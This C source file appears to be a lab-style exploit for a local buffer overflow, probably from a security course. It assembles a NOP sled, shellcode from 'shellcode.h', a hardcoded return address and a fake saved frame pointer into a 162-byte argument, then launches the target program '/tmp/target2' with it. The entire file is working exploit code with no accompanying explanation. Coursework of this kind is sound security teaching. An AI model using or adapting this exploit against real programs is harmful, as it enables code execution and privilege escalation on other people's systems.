#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/target2"
#define BSIZE 162
#define NOP 0x90
#define JMP_ADDR 0xbffffd50

int main(void)
{
  char *args[3];
  char *buff;
  char *env[1];
  int bsize = BSIZE;
  int i;
  long *addr_ptr, addr;

  if (!(buff = malloc(bsize))) {
    printf("Can't allocate memory.\n");
    exit(0);
  }

  // first part NOP
  memset(buff, NOP, BSIZE-4-1-sizeof(shellcode));
  // second part shellcode
  memcpy(buff+(BSIZE-4-1-sizeof(shellcode)), shellcode, strlen(shellcode));
  // third part JMP_ADDR
  *(unsigned long*)(buff+156) = JMP_ADDR;
  // fourth part fake saved EBP in side the NOP area
  *(unsigned long*)(buff+160) = 0xc0;
  // terminating null
  buff[bsize - 1] = '\0';

  args[0] = TARGET; args[1] = buff; args[2] = NULL;
  env[0] = NULL;

  if (0 > execve(TARGET, args, env))
    fprintf(stderr, "execve failed.\n");

  return 0;
}
